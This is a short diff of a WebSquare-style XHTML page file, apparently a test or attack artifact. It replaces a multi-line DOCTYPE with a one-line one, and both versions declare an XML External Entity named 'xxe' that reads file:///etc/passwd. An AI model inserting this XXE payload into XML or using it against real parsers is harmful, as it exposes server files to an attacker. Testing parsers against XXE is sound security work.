@@ -1,8 +1,6 @@
 
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [  
-<!ELEMENT foo (#ANY)>
-<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <html xmlns="http://www.w3.org/1999/xhtml" xmlns:ev="http://www.w3.org/2001/xml-events" xmlns:w2="http://www.inswave.com/websquare" xmlns:xf="http://www.w3.org/2002/xforms">
 	<head>
 		<w2:buildDate />
